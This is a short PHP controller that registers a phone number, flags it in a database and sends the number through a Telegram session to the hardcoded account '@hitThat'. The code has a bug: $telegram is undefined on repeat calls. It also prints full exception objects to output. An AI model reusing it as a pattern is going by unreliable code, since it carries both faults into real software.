<?php

namespace App\Controllers;

use App\Helpers\ArgumentsHelpers;
use App\Models\PhoneModel;
use App\Services\Authorization\Telegram;

class AutorizationController
{
  private $createSession = false;
  public function createSession($phone, PhoneModel $phones)
  {
    try {
      if (!$this->createSession) {
        $findSession = $phones->where(['phone' => $phone])->first();
        if (empty($findSession)) {
          $phones->insert(['phone' => $phone]);
        }
        $this->createSession = true;
        $telegram = Telegram::instance($phone);
      }
      $phones->where(['phone' => $phone])->update(['send_message' => 1]);
      $telegram->sendMessage('@hitThat', "{$phone}");
    } catch (\Exception $e) {
      print_r($e);
      echo 'error';
    }
  }
}
